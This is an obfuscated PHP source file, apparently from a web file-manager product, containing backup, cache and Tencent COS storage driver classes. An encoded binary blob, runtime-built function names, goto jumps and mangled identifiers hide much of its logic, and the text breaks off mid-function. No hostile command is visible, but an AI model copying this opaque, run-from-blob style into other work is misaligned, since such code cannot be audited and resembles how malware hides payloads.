M=<ØäI\\Æ¹±vÉ.oSÿ)')."\120\11\376\12\75\315\242\103\72\26\50\262\23\16\23\316\41\62\2\3\156\123\263\164\270\250\163\52\306\333\34\320\225\174\203\370\103\241\171\344\146\12\101\166\213\76\241\30\367\177\44\212"."\72\163\312\64\0\145\53\102\344\305\1\224\172\245\206\172\113\344\276\155\224\71\314\342\203\370\0\261\160\30\310\346\55\333\111\277\105\176\44\43\115\11\115\300\362\237\2\27\340\321\71\147"."\x51\x3c\xb1\xf5\x6c\x32\xe3\xf2\xde\x49\xe8\xb0\x38\xff\x61\x2d\x4b\x23\x3b\x54\x92\x60\x93\x8e\x85\x58\x6f\xb8\x4e\x34\xf6\x7\x94\xeb\x31\xe4\x51\x27\xf4\x1c\xbf\x93\xa2\xbe\x50\xa9\x20\xc2\x85\xce\x23\x9a".base64_decode('VepVjRb/vylIM6OSqVt7JaUNMp37p+DlsMO4tDFgd5CKU5wu4mzO4aQVRuwXyO7s7IVcJQ==')."\x7e\x99\x14\xe2\xdb\x5a\x41\xc4\x8\xe6\x1e\xeb\xe9\xb0\x83\x2e\x1\x96\x3e\x3d\x9e\xfe\x74\xc1\x2f\xdb\xd\x9d\x8d\xa0\x74\xe\x3e\x59\xcd\x51\xd1\x9f\xd6\x33\xa9\x2\xd7\xc0\x12\x9\xad\x9a\x90\x3e\x90\x52"."\210\260\344\125\346\303\233\70\217\204\356\162\127\120\345\374\6\142\273\246\166\217\126\302\121\230\330\172\355\216\223\370\35\277\51\226\220\151\331\134\165\305\214\230\332\353\242\250\212\211\242\210"."\65\14\311\141\131\117\237\364\2\145\62\11\141\212\317\367\134\11\200\171\337\114\271\210\153\110\112\27\235\276\246\244\365\311\311\257\134\272\67\143\44\324\14\250\7\332\136\325\25\320\21\115"."\143\133\210\15\214\46\171\325\174\136\334\207\310\73\56\372\327\366\140\32\362\72\142\55\161\142\74\44\116\225\26\242\2\347\244\73\112\232\10\367\225\305\134\220\336\313\330\122\13\322\341\121".base64_decode('NhJN72rEu1sAR+1sp5ezMGBylezCnMvZET3iZ2xv6QU71iwDikJ8yAsFE2LJQz7dAYAyRw==').base64_decode('EahhW8gYlRCLTZ1vEkohU7SvSJX8oIGTz3JuzSjmk59GrYeflHBc8AayASShb+P0v1nqSw==').base64_decode('lPkNZUsHnIaW8QQ6qiNRl3hi/VXe0sSDXrtreNwPzlnww0jJecZ5lOHD6igQcQ5yzCgVOg==').strrev('›«Õ;)rN@äxB¶¿Zş2Ğœæİój¶õ–9)‹†6ˆ¸ÈX»õ ÃJ¥]JÚ@×©S››')."\223\50\260\153\153\47\230\156\303\135\264\1\213\127\176\324\44\164\311\6\261\64\233\252\235\62\155\226\54\61\21\123\50\56\163\231\223\12\372\3\74\216\100\12\305\66\14\56\205\331\241\226"."\127\77\311\264\277\250\51\165\355\353\330\1\376\147\13\106\34\76\50\250\244\210\133\352\4\275\144\4\10\236\112\352\140\322\206\350\320\373\61\260\52\216\51\126\35\335\2\205\103\137\373\267"."\x28\xfb\x50\xa6\x1f\xe2\xb3\xd2\x62\xa1\xce\x59\x8d\xc\x3e\xb8\x67\xf1\x85\x80\x55\x50\xed\xe7\xd1\x72\xc7\x2e\x32\x12\xec\x8c\x87\x65\xba\x22\x66\xd7\x8c\x2\x11\x8d\xc8\x96\xce\x65\x72\x8d\x96\xe1\x94\x2f".strrev('œ }ó0¤¯ÆS23çx(ûs\'m÷pÂT&4ôXÈş‰D›V!?¶6Û.pÒ²$_xâá')."\36\77\132\272\125\313\55\41\247\44\237\324\254\60\231\154\40\27\342\4\154\357\267\243\172\124\114\324\321\355\122\106\3\52\145\367\44\177\275\302\346\241\304\350\341\322\354\365\370\50\2\4".strrev('µİüÍ}3H(4MÅ‚=NDNÄ*ÎrZ­(úòEIg/Ë¾Ì–2Û],‡œa_ËÉDîÉ2ÎÙxò')."\x2a\xe9\xf7\xd9\x65\x61\xc0\xdc\x49\x9e\xc5\xd1\xf0\x49\xce\xb7\xd\x39\x2c\x39\xfd\x45\x7b\x42\x98\xbd\x8f\x40\xcd\xb1\x1d\x63\x51\xbc\xd1\xe1\x98\x9d\xd0\x2f\xa7\xb7\x76\x36\x66\x84\x68\x8\x7a\x28\xbd\xe7"._kodDe('Lg2nqIU6r8HLZLmdKpw1vZA5IbSaJ78+ADLibn7KPUlqapNAlSFLEhs0goyJaKe9lvHc3KY=')."\xe7\xa0\x11\xcc\x98\x82\xe9\xf0\x65\x4d\xed\x98\xd3\x30\x3b\x16\xfc\xaf\xfd\xb5\xfe\xbf\x72\xd3\x3a\xad\x86\xc9\xfe\x6d\xee\xdd\x9b\x81\x39\x87\xd6\xe2\xb\x56\x2e\xeb\xa0\x72\x67\x47\x3f\xec\xdb\xeb\xd1\x80"."\x45\x68\xf0\x3d\x92\x77\x79\x12\xe7\x5a\xe2\xcc\xba\x23\x33\xfa\xa8\xb2\xfb\x37\x35\x93\x91\x36\xe1\xf2\xc7\x99\x12\x27\xda\x8\xf9\xfa\xb8\xe3\xe5\x72\x11\xe7\x1b\x61\xa7\x43\xed\x4e\x22\xf6\x65\xbe\xb2\xbb"."\313\1\12\272\304\117\115\145\360\230\46\61\146\131\320\244\234\236\354\53\163\171\116\264\144\355\176\7\44\346\244\4\114\264\1\361\60\314\154\246\227\205\222\370\270\110\114\304\300\350\311\317"."\370\303\171\166\260\254\206\135\240\33\176\301\164\10\20\55\231\120\331\222\112\310\133\314\66\47\266\104\171\270\5\15\362\260\351\264\225\150\165\370\7\246\100\314\52\60\350\106\310\364\124\122".strrev('îDır1ba,,Z'."\n".'.©{şmï²]ÜuGnÉ„ÜkºFãdğÉ‹·ÔV¹Ó‰­(«Õ,á')."\241\335\245\145\50\216\107\5\314\50\253\254\374\132\347\215\22\242\101\34\222\307\203\321\214\366\202\101\230\106\173\52\27\21\111\272\323\111\111\376\352\344\3\151\362\170\217\334\21\371\202\326".base64_decode('fsuDlffEtWcsHAnEFwex+YngskAHM5ysG8THCauyo7WKvFKDxYBONE2GQCsNETZJGCys/w==').base64_decode('Wtm8n1/S2t86Sy8imO0tWTxpB8bPWuzrcm45sKRRMGXTmbZMzIIZKDfCztQdObSotaSlpQ==')."\24\274\231\333\370\373\316\251\65\123\272\277\252\226\251\314\117\31\202\234\372\65\220\160\320\210\116\161\63\75\137\6\123\266\234\101\155\345\224\313\303\236\351\55\33\22\11\7\71\116\307\70"."\x4d\x36\x3b\x54\x75\x92\xb8\x54\x21\x16\xb9\xc0\x43\xd2\x28\x73\xd3\x66\xf8\x5\x9b\xe1\xc8\xc3\x64\x62\xf4\x5c\x7c\x52\xe5\x37\xd1\xcc\x9f\xa\xd6\xa1\xf3\x62\x83\x5d\xf8\xa1\x86\x97\xe0\x1f\x48\xb9\x97\xc6"."\263\161\246\122\204\345\3\102\312\103\250\157\351\371\20\276\144\25\206\302\205\110\226\277\317\40\222\35\52\254\261\311\154\100\163\100\116\222\156\322\321\301\53\145\167\51\106\62\111\62\263\320".base64_decode('DTVId8H2q3j+frVkLyzqISmblGKWXtEvfoofFOaSSDa9z/L1q9wimbNUh+1QK13cJwmFCA==')."\x94\xde\xcd\x8a\x2b\x63\x89\x93\x64\xc5\xf0\xa9\x58\x6c\xf2\x8e\x74\x89\xa2\x8a\xfd\x4f\xed\x17\x7c\xb1\x38\x97\xa5\x52\x4d\x6a\x7f\x19\xd0\x94\xe6\xb4\x28\x87\x52\x38\x28\xe1\xab\x25\x3b\x1b\xe2\xd1\x8c\x36"."\40\177\35\340\304\233\26\33\140\151\252\260\303\41\225\27\367\161\242\233\70\255\134\367\11\205\263\27\227\355\174\160\244\22\111\324\145\24\327\162\221\316\300\130\15\110\250\277\320\256\160\121"."\217\370\244\335\252\10\7\343\163\206\140\310\213\72\267\55\325\161\252\307\122\65\306\23\72\262\100\316\44\125\137\126\34\45\241\200\226\11\111\325\311\167\365\243\26\210\226\377\210\300\112\373"."\x10\x4b\xe6\x58\x44\x6\x63\x5f\xe4\x5a\x6c\x7b\x16\xef\x18\x40\x46\xe4\x4c\x5b\x73\x9c\x53\x4b\xe\xa1\x2\x7d\x69\x62\x96\x88\xf4\x69\x9e\xcf\x9e\x45\xe1\x35\x47\xeb\xe5\x2\xce\x9e\xd1\x12\x36\x6f\x82\x72"."\xfa\x80\x6e\x25\xd3\xd2\x89\xb9\x34\xb3\x34\xbd\x50\x32\xd8\xd0\x80\xf2\xfd\x70\xb6\x96\x8d\xb5\x53\x8e\x20\x2a\x29\x69\x8f\xa4\x8\x14\x33\xca\x94\xa1\x2d\x2a\x5b\x8c\x66\xe1\x92\xe2\xa0\x62\x2b\x3b\xca\x10"."\xe0\xb2\x34\xb\x97\x2d\xc9\x66\x85\x4b\xc6\x95\x94\xb3\xd4\xa2\x39\x4a\xf7\x4a\x7\xf\xe4\x52\xa9\x32\x1d\x16\xd2\x1b\x9\x74\xb4\xf1\x2c\xb\x5c\xfa\x39\xc0\x44\x27\x34\x11\x64\x95\x6f\x85\x90\x3f\x39\x54"."\57\312\265\242\54\360\250\255\160\102\13\236\3\237\106\313\345\330\364\227\354\73\112\71\272\315\162\312\120\152\112\205\106\125\154\22\312\76\245\133\206\310\53\243\172\104\77\211\271\37\331\164".strrev('s˜¼”öø3—Ù/®ázV¡æte‚ÄEU08¸À€ytH*í1•,¤S¦¼©Yl™c')."\362\25\234\343\134\122\233\35\365\163\105\311\314\173\331\7\47\56\54\44\52\25\307\144\124\376\362\117\150\301\321\363\263\201\216\172\232\335\226\274\154\301\221\346\263\217\144\44\221\264\103\32"."\x2c\x44\x56\x36\x65\x98\x32\x32\x52\x92\x44\x83\x1e\x71\x31\x43\xeb\x13\x7d\x91\x70\xc2\xf6\x1e\x8c\xb2\x24\x70\x9f\x45\xaf\xc2\xfd\x58\x3f\x83\x5f\x82\x12\x83\xe6\x74\xb\xa7\xd9\x51\xa3\x60\xb9\x70\x5e\xcc"."\310\223\337\6\303\262\204\146\11\225\21\21\66\33\357\303\56\111\161\12\205\304\215\47\156\24\271\112\43\150\113\50\26\11\302\245\74\26\276\104\65\232\113\350\234\55\202\257\350\170\104\336"."\x66\xe1\x72\xbe\xa9\xe8\x50\x1f\x10\x9\x7d\x46\x2a\x61\xc\x32\xb3\x89\x8\xaf\xa4\x41\x12\x97\x78\xaa\x93\xb7\x14\x6c\x11\xa0\xa2\xac\x6\x46\x4c\x8b\x98\x5e\x9a\xe3\x5\xc7\x45\x6e\x52\x7\x78\x49\xf5\xac"."\xc8\xf7\xda\x8a\x53\xbf\x93\x5c\x89\xfb\xab\x6a\x0\x41\xbe\xa8\x82\x7a\x2d\x21\x52\x55\x78\xaf\x16\x8d\x45\x4b\xb2\xda\x7d\xd1\xe8\xe2\x70\xa4\x91\x3a\x39\x29\xc9\x26\xa5\x24\x65\xbb\x92\xac\xf6\x96\x70\xdb".base64_decode('aHmBVl8wVJKH9fLa4sIAJ80KtpNWknvo0VoR9C8QLSm1e8ruzULgSFPMi3SPlE8b7HqIwQ==')."\x47\xd5\xc\x13\xc\x49\xf7\xc\x5a\x56\x58\x68\x15\x65\xec\xf2\x2e\x79\xfe\x4d\x66\x4a\x99\x7\xec\x9e\x5\x1d\x6a\xb2\xc\xb1\xa1\x22\xac\x65\xd7\x6\x75\x47\xf2\x90\x8a\x9d\xc3\x70\xfa\xc0\xf9\x7c\xa1\xea".base64_decode('4bGphEjpZA0RoiThprzfk4SJZQdIvncovRMjuWIAcMPONhI0ssJISHde9JQF781hSCVNSg==')."\32\266\145\133\152\157\131\315\10\52\116\306\124\102\10\172\377\17\312\235\230\351\370\267\0\0"."".""."".strrev('').base64_decode(''), 10, -8))); goto D¥£ããŠÊ; d”Êø¤óáÀ: class BackupFile { public function __construct() { } public function index() { $±Î÷İ± = Backup::get(); $ÎÉ›Ôµ = $±Î÷İ±[$_SERVER[ìïæ“œî][369]][$_SERVER[ìïæ“œî][230]][$_SERVER[ìïæ“œî][541]]; $ İª›Íú = array($_SERVER[ìïæ“œî][542] => array($_SERVER[ìïæ“œî][856], $ÎÉ›Ôµ), $_SERVER[ìïæ“œî][857] => array($_SERVER[ìïæ“œî][407], $±Î÷İ±[$_SERVER[ìïæ“œî][801]])); $Í¨÷Åœ¼ = (int) Model($_SERVER[ìïæ“œî][838])->where($ İª›Íú)->count($_SERVER[ìïæ“œî][541]); $“Ê‰–÷ë = (int) Model($_SERVER[ìïæ“œî][838])->where($ İª›Íú)->sum($_SERVER[ìïæ“œî][79]); $Éçí‰¦ = new TaskFileTransfer($_SERVER[ìïæ“œî][858], $_SERVER[ìïæ“œî][832], $Í¨÷Åœ¼, LNG($_SERVER[ìïæ“œî][833]) . $_SERVER[ìïæ“œî][834] . LNG($_SERVER[ìïæ“œî][859])); $Éçí‰¦->task[$_SERVER[ìïæ“œî][812]] = $“Ê‰–÷ë; $¼»Ñ·”€ = array($_SERVER[ìïæ“œî][860] => $Í¨÷Åœ¼, $_SERVER[ìïæ“œî][861] => $“Ê‰–÷ë, $_SERVER[ìïæ“œî][862] => time()); Backup::set($¼»Ñ·”€); $ì¦ûï«ü = !0; $æè—ÂıÍ = $this->storeIds(); $„¬§ÚÖö = 1; $âÎ™Šµ° = 1000; $‹³»’Ç— = $¹÷œ²Š· = 0; $ò…Ù¤Ñ  = array(); $½ÙËÎ÷Â = $›åÍ•× = 0; do { $Úğş¹šÛ = $_SERVER[ìïæ“œî][863]; $ì€İ¼Èö = Model($_SERVER[ìïæ“œî][838])->where($ İª›Íú)->field($Úğş¹šÛ)->order($_SERVER[ìïæ“œî][864])->selectPage($âÎ™Šµ°, $„¬§ÚÖö); $¸š…··® = !empty($ì€İ¼Èö[$_SERVER[ìïæ“œî][445]]) ? $ì€İ¼Èö[$_SERVER[ìïæ“œî][445]] : array(); foreach ($¸š…··® as $¯Ñùµ¶å) { if (!$this->_fileExist($¯Ñùµ¶å, $ò…Ù¤Ñ , $æè—ÂıÍ)) { write_log("\x66\151\154\145\40\x6e\157\164\40\145\170\x69\163\x74\56\146\151\154\145\x49\104\x3a{$¯Ñùµ¶å[$_SERVER[ìïæ“œî][541]]}\54\40\160\141\164\150\72{$¯Ñùµ¶å[$_SERVER[ìïæ“œî][87]]}", $_SERVER[ìïæ“œî][865]); continue; } $­Î«§ªå = $¯Ñùµ¶å[$_SERVER[ìïæ“œî][87]]; $Ñèçõ¬ = "\173\151\x6f\72{$±Î÷İ±[$_SERVER[ìïæ“œî][801]]}\x7d" . substr($­Î«§ªå, strlen("\173\x69\x6f\72{$¯Ñùµ¶å[$_SERVER[ìïæ“œî][866]]}\175")); if (IO::exist($Ñèçõ¬)) { $Éçí‰¦->updateFileEnd($¯Ñùµ¶å[$_SERVER[ìïæ“œî][32]], $¯Ñùµ¶å[$_SERVER[ìïæ“œî][79]]); } else { $Ñèçõ¬ = get_path_father($Ñèçõ¬); IO::mkdir($Ñèçõ¬); if (!IO::copy($­Î«§ªå, $Ñèçõ¬, $_SERVER[ìïæ“œî][867])) { write_log($_SERVER[ìïæ“œî][868] . $­Î«§ªå . $_SERVER[ìïæ“œî][852] . $Ñèçõ¬ . $_SERVER[ìïæ“œî][178], $_SERVER[ìïæ“œî][832]); $ì¦ûï«ü = !1; break; } } $ÎÉ›Ôµ = $¯Ñùµ¶å[$_SERVER[ìïæ“œî][541]]; $¹÷œ²Š· += 1; $‹³»’Ç— += $¯Ñùµ¶å[$_SERVER[ìïæ“œî][79]]; $›åÍ•× += 1; $½ÙËÎ÷Â += $¯Ñùµ¶å[$_SERVER[ìïæ“œî][79]]; if ($‹³»’Ç— >= 1024 * 1024 * 100) { $¼»Ñ·”€ = array($_SERVER[ìïæ“œî][800] => $ÎÉ›Ôµ, $_SERVER[ìïæ“œî][869] => $›åÍ•×, $_SERVER[ìïæ“œî][870] => $½ÙËÎ÷Â); Backup::set($¼»Ñ·”€); $‹³»’Ç— = $¹÷œ²Š· = 0; } } $İñØÚÛ† = count($¸š…··®); $„¬§ÚÖö++; } while ($İñØÚÛ† == $âÎ™Šµ°); $Éçí‰¦->end(); $¼»Ñ·”€ = array($_SERVER[ìïæ“œî][871] => 1, $_SERVER[ìïæ“œî][810] => time(), $_SERVER[ìïæ“œî][824] => 1, $_SERVER[ìïæ“œî][800] => $ÎÉ›Ôµ, $_SERVER[ìïæ“œî][872] => time()); if ($¹÷œ²Š·) { $¼»Ñ·”€[$_SERVER[ìïæ“œî][869]] = $›åÍ•×; $¼»Ñ·”€[$_SERVER[ìïæ“œî][870]] = $½ÙËÎ÷Â; } Backup::set($¼»Ñ·”€); return !0; } private function _fileExist($Ñ ›Õç, &$ˆÆ¨ƒµ’, $‡Ù¿ïİ) { $„“Ó‰ÃÙ =& $_SERVER[ìïæ“œî]; $’µÇôÎò = $Ñ ›Õç[$„“Ó‰ÃÙ[87]]; if (in_array($Ñ ›Õç[$„“Ó‰ÃÙ[541]], $ˆÆ¨ƒµ’)) { return !1; } if (!in_array($Ñ ›Õç[$„“Ó‰ÃÙ[866]], $‡Ù¿ïİ)) { return !1; } if (IO::exist($’µÇôÎò)) { return !0; } $ªûœœ×é = get_path_father($’µÇôÎò); if (IO::exist($ªûœœ×é)) { $ˆÆ¨ƒµ’[] = $Ñ ›Õç[$„“Ó‰ÃÙ[541]]; return !1; } $½ßö¹— = array($„“Ó‰ÃÙ[866] => $Ñ ›Õç[$„“Ó‰ÃÙ[866]], $„“Ó‰ÃÙ[87] => array($„“Ó‰ÃÙ[459], "{$ªûœœ×é}\45")); $–¦ãĞÓ = Model($„“Ó‰ÃÙ[838])->where($½ßö¹—)->field($„“Ó‰ÃÙ[542])->select(); $ˆÆ¨ƒµ’ = array_merge($ˆÆ¨ƒµ’, array_to_keyvalue($–¦ãĞÓ, $„“Ó‰ÃÙ[12], $„“Ó‰ÃÙ[541])); return !1; } private function _fileFilter($ÙÓ¾‡·) { $üë×ˆĞ§ =& $_SERVER[ìïæ“œî]; return; if (empty($ÙÓ¾‡·)) { return; } $Ü¸¤é‹É = array($üë×ˆĞ§[541] => array($üë×ˆĞ§[7], array_unique($ÙÓ¾‡·))); $¨×Ëºƒ£ = Model($üë×ˆĞ§[873])->where($Ü¸¤é‹É)->field($üë×ˆĞ§[193])->select(); foreach ($¨×Ëºƒ£ as $¤öÇö—Ø) { Model($üë×ˆĞ§[873])->remove($¤öÇö—Ø[$üë×ˆĞ§[193]], !1); } } private function storeIds() { $ìÔ¤„—ç =& $_SERVER[ìïæ“œî]; $­‹şÃˆ = Model($ìÔ¤„—ç[816])->listData(); $‡Ş¯ªü = array(); $¤Åê÷™» = $GLOBALS[$ìÔ¤„—ç[6]][$ìÔ¤„—ç[92]][$ìÔ¤„—ç[874]]; foreach ($­‹şÃˆ as $ïÂ«€“) { $Ÿæ„„ò = strtolower($ïÂ«€“[$ìÔ¤„—ç[98]]); if (!isset($¤Åê÷™»[$Ÿæ„„ò])) { continue; } $ø’ù„¿Ø = $ìÔ¤„—ç[77] . (isset($¤Åê÷™»[$Ÿæ„„ò]) ? $¤Åê÷™»[$Ÿæ„„ò] : ucfirst($Ÿæ„„ò)); if (!class_exists($ø’ù„¿Ø)) { continue; } $‡Ş¯ªü[] = $ïÂ«€“[$ìÔ¤„—ç[475]]; } return $‡Ş¯ªü; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $«©Ë¿ÙŠ =& $_SERVER[ìïæ“œî]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $“ÄÆæ…· = $GLOBALS[$«©Ë¿ÙŠ[6]][$«©Ë¿ÙŠ[425]]; $Ãüª…“Ù = $“ÄÆæ…·[$“ÄÆæ…·[$«©Ë¿ÙŠ[875]]]; $÷Œ‡òñŞ = $“ÄÆæ…·[$«©Ë¿ÙŠ[876]]; switch ($“ÄÆæ…·[$«©Ë¿ÙŠ[875]]) { case $«©Ë¿ÙŠ[21]: self::$handle = Model($«©Ë¿ÙŠ[877]); break; case $«©Ë¿ÙŠ[878]: self::$handle = new CacheRedis($Ãüª…“Ù, $÷Œ‡òñŞ); break; case $«©Ë¿ÙŠ[879]: self::$handle = new CacheMemcached($Ãüª…“Ù, $÷Œ‡òñŞ); break; case $«©Ë¿ÙŠ[230]: self::$handle = new CacheFile($Ãüª…“Ù, $÷Œ‡òñŞ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($çÆ²¬òô) { if (is_array($çÆ²¬òô) || is_object($çÆ²¬òô)) { $çÆ²¬òô = json_encode($çÆ²¬òô); } $çÆ²¬òô = rawurlencode($çÆ²¬òô); return md5(KOD_SITE_ID . $_SERVER[ìïæ“œî][11] . $çÆ²¬òô); } public static function get($³„ Öï‘, $éê´ÑºÌ = false) { $ä–¼Ä = self::key($³„ Öï‘); $òÃÇ¹•Ë = self::init(); if ($éê´ÑºÌ) { return unserialize($òÃÇ¹•Ë->get($ä–¼Ä)); } if (!isset(self::$memoryCache[$ä–¼Ä])) { $´»½”” = $òÃÇ¹•Ë->get($ä–¼Ä); self::$memoryCache[$ä–¼Ä] = unserialize($´»½””); } return self::$memoryCache[$ä–¼Ä]; } public static function set($¼Â¦ù, $ü¥Ë‚ƒ, $‹®’ó¢á = false) { $»šöı…¥ =& $_SERVER[ìïæ“œî]; $ÇíÛøƒ = self::key($¼Â¦ù); if (isset(self::$memoryCache[$ÇíÛøƒ]) && self::$memoryCache[$ÇíÛøƒ] === $ü¥Ë‚ƒ) { return !0; } if ($‹®’ó¢á === 0) { self::$memoryCache[$ÇíÛøƒ] = $ü¥Ë‚ƒ; return !0; } $ˆ³¥ÃÇª = self::init(); $Î€˜îá = serialize($ü¥Ë‚ƒ); CacheLock::lock($¼Â¦ù . $»šöı…¥[880]); $’Ô÷ìŞ¦ = $ˆ³¥ÃÇª->set($ÇíÛøƒ, $Î€˜îá, $‹®’ó¢á); self::$memoryCache[$ÇíÛøƒ] = $ü¥Ë‚ƒ; CacheLock::unlock($¼Â¦ù . $»šöı…¥[880]); return $’Ô÷ìŞ¦; } public static function getCall($ˆÔŠ§™, $Áá©Æ¦Æ, $…ş·ÖËó, $ÁçÎÉ¾˜ = array()) { $Åóîİä¸ =& $_SERVER[ìïæ“œî]; $¹ÌÛ²ù = self::get($ˆÔŠ§™); if ($¹ÌÛ²ù || $¹ÌÛ²ù === $Åóîİä¸[12]) { return $¹ÌÛ²ù; } $¹ÌÛ²ù = call_user_func_array($…ş·ÖËó, $ÁçÎÉ¾˜); $¹ÌÛ²ù = $¹ÌÛ²ù ? $¹ÌÛ²ù : $Åóîİä¸[12]; self::set($ˆÔŠ§™, $¹ÌÛ²ù, $Áá©Æ¦Æ); return $¹ÌÛ²ù; } public static function remove($ŸÚ“Õ‚) { $¬á¯¨¹· = self::key($ŸÚ“Õ‚); unset(self::$memoryCache[$¬á¯¨¹·]); self::clearTimeout(); CacheLock::lock($ŸÚ“Õ‚); $Ä‹ÎæßÔ = self::init()->remove($¬á¯¨¹·); CacheLock::unlock($ŸÚ“Õ‚); return $Ä‹ÎæßÔ; } public static function removeMemory($÷‘¸«óó) { $§â®±ÏÄ = self::key($÷‘¸«óó); unset(self::$memoryCache[$§â®±ÏÄ]); } public static function clearMemory($òÙ±˜Ò¯ = false) { if ($òÙ±˜Ò¯) { $òÙ±˜Ò¯ = self::key($òÙ±˜Ò¯); unset(self::$memoryCache[$òÙ±˜Ò¯]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ìïæ“œî][881])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ìïæ“œî][882])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÓÓÀ£, $‘ô©’½ş) { $İ´Ã­Ã =& $_SERVER[ìïæ“œî]; $this->cachePath = $ÓÓÀ£[$İ´Ã­Ã[87]]; $this->prefix = $İ´Ã­Ã[883]; $this->cacheTime = $‘ô©’½ş; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($±ú­‰ƒÖ) { $ø€ôßıŠ =& $_SERVER[ìïæ“œî]; $±ú­‰ƒÖ = str_replace(array($ø€ôßıŠ[884], $ø€ôßıŠ[100], $ø€ôßıŠ[76]), $ø€ôßıŠ[885], $±ú­‰ƒÖ); return $this->cachePath . $ø€ôßıŠ[886] . $±ú­‰ƒÖ . $ø€ôßıŠ[887]; } public function set($¯¯èĞ’ƒ, $İˆÚÖ¬, $ŒŒ²äå¬ = false) { $ŒŒ²äå¬ = $ŒŒ²äå¬ ? $ŒŒ²äå¬ : $this->cacheTime; $´ì§–Ã = $this->getFile($¯¯èĞ’ƒ); if (file_put_contents($´ì§–Ã, $this->prefix . $İˆÚÖ¬, LOCK_EX)) { @touch($´ì§–Ã, intval(time() + $ŒŒ²äå¬)); clearstatcache(); return !0; } @unlink($´ì§–Ã); return !1; } public function get($ÆšøÓ) { $é£œ° = $this->getFile($ÆšøÓ); if (file_exists($é£œ°) && filemtime($é£œ°) < time()) { @unlink($é£œ°); return !1; } $ıŒÇ»Ï = @file_get_contents($é£œ°); return substr($ıŒÇ»Ï, strlen($this->prefix)); } public function remove($‡İ€¿œ) { $›ß•Àü = $this->getFile($‡İ€¿œ); return @unlink($›ß•Àü); } public function deleteAll() { $—±—Í¡ =& $_SERVER[ìïæ“œî]; $©¬½„îñ = scandir($this->cachePath); foreach ($©¬½„îñ as $áÄ²ÇÍŞ) { $¤—’„˜Ì = $this->cachePath . $áÄ²ÇÍŞ; if (strpos($¤—’„˜Ì, $—±—Í¡[887]) && strpos($¤—’„˜Ì, $—±—Í¡[888])) { @unlink($¤—’„˜Ì); } } } public function clearTimeout() { $å˜‚‘·¹ =& $_SERVER[ìïæ“œî]; $’•Şúóİ = scandir($this->cachePath); foreach ($’•Şúóİ as $’¯¹ïõ¯) { $¡¥çÇğ£ = $this->cachePath . $’¯¹ïõ¯; if (strpos($¡¥çÇğ£, $å˜‚‘·¹[887]) && strpos($¡¥çÇğ£, $å˜‚‘·¹[888]) && filemtime($¡¥çÇğ£) < time()) { @unlink($¡¥çÇğ£); } } } } goto F—Êª¶ñîÓ; F³í¹Æ´éŞ: $fileSize = strrev(base64_decode($_SERVER[–èóã][0])); function binCheckNeq($š¿µ¯—, $²…É‚…ø) { return $š¿µ¯— != $²…É‚…ø; } $_SERVER[$_SERVER[–èóã][1]] = $fileSize($_SERVER[$_SERVER[–èóã][2]]); goto dõ”Ò—áó; C‡‘¿ÅÅÛ¿: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ş¶×ëÍä) { parent::__construct($Ş¶×ëÍä); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } public function uploadFormData($‡Œº¸ß•, $û´€³å³ = 3600) { $³È›£‰§ =& $_SERVER[ìïæ“œî]; $Â‘ÀùøÚ = $³È›£‰§[229]; $İÒª¯ğ = $³È›£‰§[263]; $ä™ÄÄ¼ = $³È›£‰§[274]; $™‰‡ñÚ¢ = gmdate($³È›£‰§[299], time() + $û´€³å³); $Ñ®”ï = (string) time() . $³È›£‰§[74] . (string) (time() + $û´€³å³); $‡†°¹¥ = array($³È›£‰§[275] => $™‰‡ñÚ¢, $³È›£‰§[278] => array(array($³È›£‰§[280] => $Â‘ÀùøÚ), array($³È›£‰§[279] => $this->bucket), array($³È›£‰§[281], $³È›£‰§[282], $³È›£‰§[12]), array($³È›£‰§[285] => $ä™ÄÄ¼), array($³È›£‰§[1387] => $İÒª¯ğ), array($³È›£‰§[1388] => $this->accessKey), array($³È›£‰§[1389] => $Ñ®”ï))); $‡†°¹¥ = json_encode($‡†°¹¥); $ÊˆÌÅ¬µ = hash_hmac($³È›£‰§[263], $Ñ®”ï, $this->secret); $²”İ”²— = sha1($‡†°¹¥); $Ó¶ø’â = hash_hmac($³È›£‰§[263], $²”İ”²—, $ÊˆÌÅ¬µ); $ÛŸ…š˜£ = array($³È›£‰§[280] => $Â‘ÀùøÚ, $³È›£‰§[285] => $ä™ÄÄ¼, $³È›£‰§[293] => base64_encode($‡†°¹¥), $³È›£‰§[1387] => $İÒª¯ğ, $³È›£‰§[1388] => $this->accessKey, $³È›£‰§[1390] => $Ñ®”ï, $³È›£‰§[1391] => $Ó¶ø’â, $³È›£‰§[208] => $this->getHost()); return $ÛŸ…š˜£; } public function fileOutImage($¢Ù¶ÃÌè, $Õ¤ã¬› = 250) { $ô‡×ê’ =& $_SERVER[ìïæ“œî]; if ($this->size($¢Ù¶ÃÌè) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¢Ù¶ÃÌè, $Õ¤ã¬›); } $¨Øà¯ = $this->link($¢Ù¶ÃÌè); $¨Øà¯ .= $ô‡×ê’[1392] . $Õ¤ã¬› . $ô‡×ê’[1393]; $this->fileOutLink($¨Øà¯); } public function fileOutLink($¯îàô…·) { $”Ğš¼¶í =& $_SERVER[ìïæ“œî]; if (substr($¯îàô…·, 0, 7) == $”Ğš¼¶í[313]) { $¯îàô…· = $”Ğš¼¶í[314] . substr($¯îàô…·, 7); } header($”Ğš¼¶í[175] . $¯îàô…·); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¶èƒ¬†©) { $this->pathParse = $¶èƒ¬†©; $this->model = Model($_SERVER[ìïæ“œî][1394]); } public function getPath($â½±àÌ) { return trim($â½±àÌ, $_SERVER[ìïæ“œî][8]); } public function pathFather($¢ØŠ¤­¦) { $—•ãï›ö = $this->parse($¢ØŠ¤­¦); $—•ãï›ö = $this->infoSimple($¢ØŠ¤­¦); return $—•ãï›ö ? $—•ãï›ö[$_SERVER[ìïæ“œî][192]] : !1; } public function pathThis($¨‹°íÜ) { $¾¸ûâå = 